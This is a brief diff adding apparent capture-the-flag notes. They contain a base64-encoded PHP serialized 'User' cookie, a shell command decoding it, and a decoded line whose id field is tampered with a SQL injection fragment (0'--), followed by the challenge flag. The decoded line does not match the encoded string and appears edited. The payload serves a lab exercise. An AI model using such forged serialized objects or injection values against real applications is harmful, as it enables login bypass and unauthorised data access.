@@ -1,0 +1,8 @@
+Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtpOjE7czoxMToiACoAcGFzc3dvcmQiO3M6MzI6IjVmNGRjYzNiNWFhNzY1ZDYxZDgzMjdkZWI4ODJjZjk5IjtzOjEwOiIAKgBwcm9maWxlIjtOO30%3D
+
+
+└─$ echo -n Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtpOjE7czoxMToiACoAcGFzc3dvcmQiO3M6MzI6IjVmNGRjYzNiNWFhNzY1ZDYxZDgzMjdkZWI4ODJjZjk5IjtzOjEwOiIAKgBwcm9maWxlIjtOO30= | base64 -d
+
+O:4:"User":4:{s:8:"username";s:5:"guest";s:2:"id";i:0'--;s:11:"*password";s:32:"5f4dcc3b5aa765d61d8327deb882cf99";s:10:"*profile";N;}
+
+gigem{c3r3aL_t0o_sWe3t_t0d2y}
